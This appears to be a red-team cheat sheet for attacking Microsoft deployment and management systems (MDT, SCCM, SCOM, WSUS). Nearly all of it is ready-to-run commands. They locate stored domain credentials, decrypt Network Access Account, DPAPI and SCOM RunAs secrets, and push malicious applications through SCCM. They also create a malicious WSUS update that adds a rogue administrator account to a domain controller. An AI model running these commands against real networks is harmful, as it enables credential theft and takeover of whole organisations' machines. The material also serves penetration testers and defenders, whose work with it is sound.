MDT - Microsoft Deployment Toolkit

Microsoft Deployment Toolkit is a free tool from Microsoft used to automate the deployment of Windows operating systems and applications. It lets IT admins create a central deployment share with OS images, drivers, updates, and apps, then use automated scripts to install them on multiple computers.

Deployment Share Locations

Credentials used by MDT to join computers to the domain and access network resources are stored in:

  • Bootstrap.ini - DeploymentShare\Control\Bootstrap.ini
  • CustomSettings.ini - DeploymentShare\Control\CustomSettings.ini

Credential Fields in MDT

Credential Field Description
DomainAdmin Account used to join computer to domain
DomainAdminPassword Password for domain join
UserID Account for accessing network resources
UserPassword Password for network resource access
AdminPassword Local administrator account password
ADDSUserName Account for DC promotion
ADDSPassword Password for DC promotion
Password Password for promoting server to DC
SafeModeAdminPassword AD restore mode password
TPMOwnerPassword TPM password
DBID SQL server connection account
DBPwd SQL server connection password
OSDBitLockerRecoveryPassword BitLocker recovery password

Additional Credential Sources

Credentials can also be found in:

  • DeploymentShare\Control\TASKSEQUENCENAME\ts.xml
  • DeploymentShare\Scripts\ folder
  • DeploymentShare\Applications folder
  • LiteTouchPE_x86|x64.iso (extract and look for bootstrap.ini)
  • LiteTouchPE_x86|x64.wim (extract and look for bootstrap.ini)

Enumeration

## List deployment shares
Get-SmbShare | Where-Object { $_.Name -like "*Deploy*" }

## Mount deployment share
net use Z: \\<SERVER>\<SHARE>

## Search for credential files
Get-ChildItem -Recurse -Filter "*Bootstrap*"
Get-ChildItem -Recurse -Filter "*CustomSettings*"

SCCM - System Center Configuration Manager

SCCM is a solution from Microsoft to enhance administration in a scalable way across an organization.

Enumeration Tools

  • SharpSCCM - C# tool to interact with SCCM
  • PowerSCCM - PowerShell module for SCCM
  • MalSCCM - Abuse SCCM to deploy malicious applications
  • sccmhunter - Post-exploitation tool for SCCM

Basic Enumeration

## Locate SCCM server
MalSCCM.exe locate

## Enumerate as distribution point admin
MalSCCM.exe inspect /server:<DistributionPoint FQDN> /groups

## Enumerate from management server
MalSCCM.exe inspect /all
MalSCCM.exe inspect /computers
MalSCCM.exe inspect /primaryusers
MalSCCM.exe inspect /groups

Using SharpSCCM

## Get devices
.\SharpSCCM.exe get devices --server <SERVER_NAME> --site-code <SITE_CODE>

## Execute command via relay
.\SharpSCCM.exe <server> <sitecode> exec -d <device_name> -r <relay_server_ip>

## Direct execution
.\SharpSCCM.exe exec -d WS01 -p "C:\Windows\System32\ping <TARGET_IP>" -s --debug

SCCM Application Deployment Exploitation

## Create target device group
MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device

## Add targets to group
MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL

## Create malicious application
MalSCCM.exe app /create /name:demoapp /uncpath:"\\BLORE-SCCM\SCCMContentLib$\localthread.exe"

## Deploy to group

## Cleanup
MalSCCM.exe app /cleanup /name:demoapp
MalSCCM.exe group /delete /groupname:TargetGroup

SCCM Credential Extraction

CRED-1: PXE Boot Media

Requirements:

  • PXE-enabled distribution point
  • HKLM\Software\Microsoft\SMS\DP\PxeInstalled = 1
  • HKLM\Software\Microsoft\SMS\DP\IsPxe = 1

Tools:

  • pxethiefy
  • PXEThief

CRED-2: Request Policy Containing Credentials

Easy mode using SharpSCCM:

## Create machine account
addcomputer.py -computer-name 'attacker$' -computer-pass P@ssw0rd -dc-ip <TARGET_IP> lab.lan/user:'P@ssw0rd'

## Request NAA policy
SharpSCCM.exe get naa -r newdevice -u attacker$ -p P@ssw0rd
SharpSCCM.exe get naa
SharpSCCM.exe get secrets -u <username-machine-$> -p <password>

CRED-3: Extract DPAPI Blobs from WMI

Requirements: Local administrator on SCCM client

## Find SCCM blob
Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"

## Decrypt with SharpDPAPI
.\SharpDPAPI.exe blob /target:<base64_blob> /mkfile:masterkeys.txt

## Or use SharpSCCM
.\SharpSCCM.exe local secrets -m wmi

SCOM - System Center Operations Manager

Microsoft SCOM is a monitoring tool used to oversee the health and performance of servers, applications, and infrastructure.

Tools

  • SharpSCOM - C# utility for SCOM
  • SCOMDecrypt - Decrypt RunAs credentials

SCOM RunAs Credentials

RunAs credentials are stored in SCOM servers for monitoring and remote execution.

Recovery from SCOM Database

Registry keys containing database info:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseServerName
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseName

Decrypt credentials:

.\SCOMDecrypt.exe
powershell-import C:\path\to\SCOMDecrypt.ps1
powershell Invoke-SCOMDecrypt

Recovery via Registry

Stored at HKLM\SYSTEM\CurrentControlSet\Services\HealthService\Parameters\Management Groups\$MANAGEMENT_GROUP$\SSDB\SSIDs\:

.\SharpSCOM.exe DecryptRunAs

Recovery via Policy File

Use DPAPI to decrypt from policy:

cat C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Connector Configuration Cache\$MANAGEMENT_GROUP_NAME$\OpsMgrConnector.Config
SharpSCOM.exe DecryptPolicy /data:<base64-encrypted-data>

Recovery after Enrolling New Agent

## Get management group name
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HealthService\Parameters\Management Groups\*

## Enroll new agent
SharpSCOM.exe autoenroll /managementgroup:SCOM1 /server:scom.domain.lab /hostname:fake1.domain.lab /outfile:C:\Users\admin\desktop\policy_new.xml

## Decrypt the policy
SharpSCOM.exe decryptpolicy /data:"DAEAAA<REDACTED>" /key:<RSAKeyValue><Modulus><REDACTED></D></RSAKeyValue>

WSUS - Windows Server Update Services

Windows Server Update Services enables IT administrators to deploy the latest Microsoft product updates to computers on the network.

Important Note

The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary.

Tools

  • SharpWSUS

Exploitation Workflow

1. Locate WSUS Server

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
SharpWSUS.exe locate

2. After WSUS Compromise - Inspect

SharpWSUS.exe inspect

3. Create Malicious Patch

SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add ^& net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo"

4. Deploy to Target

SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:"Demo Group"

5. Check Deployment Status

SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local

6. Cleanup

SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:"Demo Group"
